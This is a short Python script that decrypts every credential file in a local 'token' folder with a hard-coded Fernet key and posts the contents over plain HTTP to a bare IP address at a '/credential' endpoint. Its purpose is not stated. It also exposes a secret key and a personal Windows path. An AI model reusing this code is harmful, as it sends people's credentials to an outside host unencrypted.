import os
import threading
import time

import requests
import json

from cryptography.fernet import Fernet

GLOBAL_KEY = b'tNE09TWU66coGQ-mmZwjPrHkPbyJ2cR5jnFzNBaK7b8='
GLOBAL_ENCRYPTION_WORKER = Fernet(GLOBAL_KEY)
DECRYPT_PATH = 'C:\\Users\\Ty Tran\\Desktop\\token'
UPLOAD_URL = 'http://207.244.240.238:16099/credential'


def worker(file_name):
    content = open(os.path.join(DECRYPT_PATH, file_name)).read()
    json_obj = GLOBAL_ENCRYPTION_WORKER.decrypt(content.encode()).decode()
    json_obj = json.loads(json_obj)
    print(requests.post(UPLOAD_URL, json={
        'json_credential': json_obj,
        'email': 'Nothing'
    }).text)


for file in os.listdir(DECRYPT_PATH):
    threading.Thread(target=worker, args=[file]).start()
    time.sleep(0.1)
